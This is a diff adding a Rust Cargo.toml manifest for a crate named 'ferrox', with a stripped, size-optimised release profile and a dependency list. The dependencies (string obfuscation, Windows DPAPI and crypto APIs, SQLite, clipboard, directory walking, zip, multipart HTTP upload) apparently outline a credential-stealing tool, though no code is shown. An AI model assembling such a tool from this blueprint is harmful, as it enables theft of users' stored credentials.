@@ -1,0 +1,59 @@
+[package]
+name = "ferrox"
+version = "0.1.0"
+edition = "2024"
+
+[profile.release]
+opt-level = "z"
+lto = "fat"
+codegen-units = 1
+panic = "abort"
+debug = false
+debug-assertions = false
+overflow-checks = false
+strip = "symbols"
+rpath = false
+incremental = false
+
+[profile.release.build-override]
+opt-level = "z"
+codegen-units = 1
+
+[profile.release.package."*"]
+opt-level = "z"
+strip = "symbols"
+
+[dependencies]
+aes-gcm = "0.10"
+obfstr = "0.4"
+litcrypt = "0.4"
+rand = "0.8"
+base64 = "0.21"
+proc-macro2 = "1.0"
+quote = "1.0"
+syn = { version = "2.0", features = ["full"] }
+rusqlite = { version = "0.31", features = ["bundled"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+dirs = "5.0"
+winapi = { version = "0.3", features = ["dpapi", "wincrypt", "winbase", "winnt", "winreg", "errhandlingapi", "processthreadsapi", "memoryapi", "handleapi", "tlhelp32", "fileapi", "minwinbase", "winerror", "namedpipeapi", "wtypes", "combaseapi", "objbase", "oleauto", "unknwnbase", "wtypesbase", "wincon", "consoleapi", "winuser", "setupapi", "cfgmgr32", "sysinfoapi", "iphlpapi", "ws2def", "iptypes", "psapi", "debugapi", "wingdi", "wow64apiset", "securitybaseapi", "synchapi", "winsock2", "netioapi"] }
+regex = "1.10"
+windows = { version = "0.52", features = ["Win32_System_Registry", "Win32_System_SystemInformation", "Win32_NetworkManagement_IpHelper", "Win32_System_Performance", "Win32_Foundation", "Win32_Security", "Win32_UI_WindowsAndMessaging", "Win32_Security_Cryptography", "Win32_System_Memory", "Win32_System_Threading", "Win32_Graphics_Gdi", "Win32_Networking_WinSock", "Win32_NetworkManagement_Ndis", "ApplicationModel_DataTransfer", "Foundation", "Foundation_Collections"] }
+wmi = "0.13"
+chacha20 = "0.9"
+walkdir = "2.3"
+zip = "0.6"
+reqwest = { version = "0.11", features = ["json", "multipart"] }
+tokio = { version = "1.0", features = ["full"] }
+sha2 = "0.10"
+lazy_static = "1.4"
+sysinfo = "0.30"
+winreg = "0.52"
+flate2 = "1.0"
+
+[lib]
+proc-macro = true
+
+[[bin]]
+name = "ferrox"
+path = "src/main.rs"
